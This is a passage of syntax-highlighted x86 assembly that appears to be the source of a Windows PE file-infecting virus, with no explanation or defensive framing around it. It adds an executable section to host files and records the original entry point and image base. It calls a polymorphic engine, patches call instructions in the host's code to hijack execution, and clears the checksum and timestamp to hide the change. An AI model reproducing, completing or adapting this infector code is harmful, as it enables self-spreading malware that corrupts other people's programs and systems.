                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf_size_log2</span><span class="sc0">

</span><span class="sc5">__cycle_sd</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__skip_sd</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf_size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_count</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_count_size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf_size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__cycle_count</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">sd_count</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__xxx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">sd_count</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__bad_buf</span><span class="sc0">
</span><span class="sc5">__xxx</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__cycle_count</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">sd_count</span><span class="sc4">[</span><span class="sc2">00h</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__bad_buf</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">sd_count</span><span class="sc4">[</span><span class="sc2">089h</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__bad_buf</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">sd_count</span><span class="sc4">[</span><span class="sc2">08Bh</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__bad_buf</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">sd_count</span><span class="sc4">[</span><span class="sc2">0E8h</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__bad_buf</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_ax</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf_size</span><span class="sc0">

</span><span class="sc5">__find_cycle</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__skip_find</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C483h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__skip_find</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__place_found</span><span class="sc0">

</span><span class="sc5">__skip_find</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__find_cycle</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__bad_buf</span><span class="sc0">

</span><span class="sc5">__place_found</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF80000h</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__good</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF80000h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__bad_buf</span><span class="sc0">

</span><span class="sc5">__good</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111b</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_ax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffffh</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_ax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf_size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

</span><span class="sc5">__bad_buf</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sd_buf_size</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__cycle_sd</span><span class="sc0">

</span><span class="sc5">__skip_sd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">__method_2_exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__set_stamp</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">pe.pe_sizeofinitdata</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">pe.pe_stackreservesize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">pe.pe_stackcommitsize</span><span class="sc0">  </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pe.pe_checksum</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pe.pe_datetime</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_neptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

</span><span class="sc5">__close</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fclose</span><span class="sc0">

</span><span class="sc5">__restattr</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dta.dta_fileattr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fsetattr</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xor_copy</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__read_last_sect</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_numofobjects</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">  </span><span class="sc1">; last section</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_neptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe_struc</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__filealign</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_filealign</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__objectalign</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_objectalign</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__method_2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__read_last_sect</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_neptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe_struc</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe1</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_numofobjects</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe1.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__set_stamp</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dta.dta_filesize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__filealign</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oe1.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__filealign</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oe1.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__objectalign</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oe1.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@saved_rel</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__objectalign</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oe1.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oe1.oe_section_flags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60000020h</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_entrypointrva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@saveeip</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe1.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe1.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__objectalign</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pe.pe_imagesize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@vir_type</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_engine</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe1.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
